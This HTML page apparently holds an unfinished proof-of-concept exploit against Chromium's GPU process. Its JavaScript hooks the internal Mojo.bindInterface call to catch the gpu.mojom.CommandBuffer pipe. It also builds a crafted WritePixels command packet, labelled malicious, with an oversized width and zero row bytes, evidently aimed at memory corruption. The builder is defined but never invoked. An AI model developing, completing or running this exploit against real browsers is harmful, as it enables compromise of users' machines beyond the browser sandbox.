<!DOCTYPE html>
<html>
<body>
    <canvas id="target-canvas" width="10" height="10"></canvas>
    <script>
        // 1. Hook MUST be synchronous and defined before any canvas code
        const originalBind = Mojo.bindInterface;
        Mojo.bindInterface = function(name, pipe, context) {
            console.log("[!] Interface requested: " + name);
            if (name === "gpu.mojom.CommandBuffer") {
                console.log("[+] CAUGHT IT! Hijacking CommandBuffer pipe!");
                // Here we could wrap the pipe if we wanted to
            }
            return originalBind.apply(this, arguments);
        };

        // 2. Helper to build the malicious packet
        function buildMaliciousWritePixels(shm_id) {
            const CMD_ID = 277; 
            const WORDS = 15;
            let buffer = new ArrayBuffer(WORDS * 4);
            let dv = new DataView(buffer);
            dv.setUint32(0, (WORDS << 21) | CMD_ID, true);
            dv.setInt32(4, 0, true);   // x
            dv.setInt32(8, 0, true);   // y
            dv.setUint32(12, 0x20000000, true); // Width
            dv.setUint32(16, 1, true); // Height
            dv.setUint32(20, 0, true); // RowBytes
            dv.setUint32(24, 4, true); // colorType
            dv.setUint32(28, 2, true); // alphaType
            dv.setInt32(32, shm_id, true); // shm_id (usually 1)
            dv.setUint32(36, 0, true); // shm_offset
            dv.setUint32(40, 0, true); // pixels_offset
            let u8_view = new Uint8Array(buffer);
            u8_view.fill(0, 44, 60);
            return u8_view;
        }

        // 3. Trigger the canvas
        const ctx = document.getElementById('target-canvas').getContext('2d');
        ctx.fillRect(0,0,10,10);
        
        console.log("[?] Interception active. Check console for interface logs.");
    </script>
</body>
</html>
